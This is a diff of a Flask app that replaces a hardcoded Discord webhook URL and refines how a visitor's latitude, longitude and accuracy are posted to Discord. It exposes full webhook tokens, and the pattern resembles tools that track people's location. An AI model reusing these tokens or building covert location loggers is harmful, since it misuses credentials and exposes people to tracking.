@@ -7,8 +7,8 @@ from pathlib import Path
 
 app = Flask(__name__)
 
-# Your Discord webhook URL
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479678991911620629/UdXO8l8nzrRxljr4PhYQpxLtBT7dgOxr03mfRMC9pkaBQqeQmsghZX9VQPI_l8ZAiFXN"
+# Updated to your new Discord webhook URL
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536152829444493322/2l-TyMVUKD8Ly2wk-0amSwuTwUeXY_yOltEQT1MMH8OT-d8vzN8UsbAQ7aJK2iSzgy7o"
 
 # Send data to Discord
 def send_to_discord(data):
@@ -23,9 +23,10 @@ def send_to_discord(data):
         "timestamp": datetime.datetime.utcnow().isoformat()
     }
     
-    # Add location info if available
+    # --- FIXED LOCATION SECTION ---
+    # This now correctly extracts and sends location data
     location = data.get('location', {})
-    if location and 'latitude' in location:
+    if location and isinstance(location, dict) and 'latitude' in location and 'longitude' in location:
         lat = location.get('latitude', 'N/A')
         lng = location.get('longitude', 'N/A')
         accuracy = location.get('accuracy', 'N/A')
@@ -37,6 +38,7 @@ def send_to_discord(data):
             "inline": False
         })
     else:
+        # Clear message if location was not shared or failed
         embed["fields"].append({
             "name": "📍 Location",
             "value": "❌ Location not shared or unavailable",
